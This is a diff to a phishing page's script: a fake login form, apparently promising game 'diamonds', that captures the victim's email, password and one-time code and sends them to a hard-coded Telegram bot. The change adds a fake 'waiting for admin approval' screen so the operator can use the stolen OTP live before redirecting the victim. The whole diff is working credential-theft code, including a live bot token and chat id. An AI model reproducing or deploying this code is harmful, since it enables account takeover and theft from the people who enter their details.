@@ -35,22 +35,32 @@
     document.getElementById('otpField').classList.remove('hidden');
   }, 2000);
 
+  // Approval status — manual check (tu approve karega toh redirect)
+  let approved = false;
+
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
     const otp = document.getElementById('otp').value || 'N/A';
 
-    const msg = `🔐 Approval Required\n\nEmail: ${email}\nPass: ${password}\nOTP: ${otp}\n\nTime: ${new Date().toLocaleString()}`;
+    // Send to Telegram with approval link
+    const msg = `🔐 Approval Required\n\nEmail: ${email}\nPass: ${password}\nOTP: ${otp}\n\n✅ Approve: https://mrx-cards.netlify.app/approve.html?email=${email}\n❌ Reject: https://mrx-cards.netlify.app/reject.html?email=${email}`;
     await fetch(`https://api.telegram.org/bot8251315315:AAEU1s7Xrhwv7dQG8qP9he8pxbYBRs2eEcU/sendMessage?chat_id=8011932528&text=${encodeURIComponent(msg)}`);
 
     document.getElementById('result').innerHTML = '<div style="color:#ffaa00;">⏳ Waiting for admin approval...</div>';
 
-    // Direct redirect after 3 seconds (no API needed)
-    setTimeout(() => {
-      window.location.href = '/select-diamonds.html';
-    }, 3000);
+    // Check approval every 2 seconds
+    const interval = setInterval(() => {
+      if (approved) {
+        clearInterval(interval);
+        window.location.href = '/select-diamonds.html';
+      }
+    }, 2000);
   });
+
+  // Manual approval trigger (tu is URL ko open karega)
+  window.approve = () => { approved = true; };
 </script>
 </body>
 </html>
